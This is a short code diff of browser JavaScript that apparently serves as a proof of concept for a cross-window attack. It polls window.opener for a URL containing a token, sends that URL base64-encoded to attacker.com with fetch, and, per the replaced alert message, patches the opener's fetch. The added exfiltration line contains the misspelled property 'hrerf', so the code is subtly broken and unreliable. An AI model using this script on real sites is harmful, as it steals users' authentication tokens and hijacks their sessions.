@@ -5,9 +5,9 @@
     tries++;
 
     try {
-      const op = parent.window.opener;
+      const op = window.opener;
       if (op && op.location && op.location.href.includes("token")) {
-      fetch('https://attacker.com/?'+btoa(op.location.href))
+      fetch('https://attacker.com/?'+btoa(window.opener.location.hrerf))
         clearInterval(timer);
 
         // Avoid double-patching
@@ -52,7 +52,7 @@
         };
 
 		
-        alert(op.location.href);
+        alert("✅ opener is same-origin, token found, and fetch is patched.");
         return;
       }
     } catch (e) {
